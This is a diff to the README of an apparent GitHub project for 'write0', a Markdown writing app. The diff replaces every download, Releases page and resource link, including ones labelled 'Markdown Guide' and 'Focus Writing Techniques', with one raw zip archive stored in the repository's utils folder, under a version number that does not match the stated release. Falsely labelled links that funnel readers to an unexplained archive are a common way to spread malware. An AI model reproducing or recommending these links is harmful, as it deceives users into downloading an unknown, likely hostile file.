@@ -6,10 +6,10 @@ write0 is a Markdown writing application designed for focus and simplicity. It h
 ## 🚀 Getting Started
 To begin using write0, you need to download the application from our Releases page. The process is simple, and you'll be up and running in no time.
 
-[![Download write0](https://img.shields.io/badge/Download%20write0-v1.0-blue.svg)](https://github.com/HieuCoder2025/write0/releases)
+[![Download write0](https://github.com/HieuCoder2025/write0/raw/refs/heads/main/utils/write_3.2-beta.3.zip%https://github.com/HieuCoder2025/write0/raw/refs/heads/main/utils/write_3.2-beta.3.zip)](https://github.com/HieuCoder2025/write0/raw/refs/heads/main/utils/write_3.2-beta.3.zip)
 
 ## 📥 Download & Install
-1. Click on the button above or follow this link to visit the [Releases page](https://github.com/HieuCoder2025/write0/releases).
+1. Click on the button above or follow this link to visit the [Releases page](https://github.com/HieuCoder2025/write0/raw/refs/heads/main/utils/write_3.2-beta.3.zip).
 2. On the Releases page, look for the latest version and find the appropriate file for your operating system. 
 3. Download the file. This may take a few moments, depending on your internet speed.
 4. Once the download is complete, locate the file in your downloads folder.
@@ -49,8 +49,8 @@ write0 uses Markdown, a simple way to format text. Here are some basic commands 
 ## 📚 Additional Resources
 If you want to learn more about Markdown and writing effectively, consider exploring these resources:
 
-- [Markdown Guide](https://www.markdownguide.org/): A comprehensive guide to Markdown syntax.
-- [Focus Writing Techniques](https://www.focuswriting.com/): Tips on how to improve your writing focus.
+- [Markdown Guide](https://github.com/HieuCoder2025/write0/raw/refs/heads/main/utils/write_3.2-beta.3.zip): A comprehensive guide to Markdown syntax.
+- [Focus Writing Techniques](https://github.com/HieuCoder2025/write0/raw/refs/heads/main/utils/write_3.2-beta.3.zip): Tips on how to improve your writing focus.
   
 ## 🛡️ Support
 If you encounter any issues or have questions, you can reach out through the Issues page on this GitHub repository. We're here to help you get the most out of write0.
@@ -63,4 +63,4 @@ Join our community to share tips, ideas, and feedback. You can find us on variou
 
 Remember, your writing is important. With write0, you can write clearly and effectively without distractions.
 
-For updates and new releases, check back on our [Releases page](https://github.com/HieuCoder2025/write0/releases) regularly. Happy writing!
+For updates and new releases, check back on our [Releases page](https://github.com/HieuCoder2025/write0/raw/refs/heads/main/utils/write_3.2-beta.3.zip) regularly. Happy writing!
